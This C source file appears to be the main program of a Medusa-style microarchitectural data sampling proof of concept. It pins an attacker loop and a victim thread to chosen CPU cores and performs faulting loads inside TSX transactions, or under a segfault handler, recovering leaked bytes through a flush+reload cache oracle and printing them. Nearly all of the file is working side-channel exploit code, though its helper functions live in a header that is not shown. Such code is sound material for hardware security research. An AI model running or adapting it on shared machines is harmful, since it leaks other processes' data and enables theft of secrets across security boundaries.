#include "medusa.h"

#define PAGE_SIZE 4096

void setup_fh(){
    signal(SIGSEGV, trycatch_segfault_handler);
    signal(SIGFPE, trycatch_segfault_handler);
}

void set_cpu(int cpuid)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpuid, &cpuset);
    int result = pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    if (result != 0) {
        printf("pthread_setaffinity_np failed!");
        exit(1);
    }
}

int victim_cpu = -1;
void * victim(void * ptr)
{
    set_cpu(victim_cpu);
    while (1)
    {
        s_prepare_buffers();
    }

}

int main(int argc, char *argv[])
{
    if (argc < 2){
        printf("usage: %s <cpu>\n", argv[0]);
        return 1;
    }

    int cpu = atoi(argv[1]);

    pthread_t tVictim;
    if (argc > 2){
        victim_cpu = atoi(argv[2]);
        pthread_create(&tVictim, NULL, victim, NULL);
    }

    set_cpu(cpu);
    setup_pages();
    setup_oracle();
    setup_fh();

    while (1) {
    #if NO_TSX
        if(!setjmp(trycatch_buf))
    #else
        if(xbegin() == (~0u))
    #endif
        {
            s_faulty_load();

        #if !NO_TSX
            xend();
        #endif
        }

        for (size_t i = 0; i < 256; i++) {
            if (flush_reload((uint8_t *)&oracles + i*PAGE_SIZE)) {
                fprintf(stdout, "%02x ", (uint8_t)i);
                fflush(stdout);
            }
        }
    }

    printf("\n");

    return 0;
}


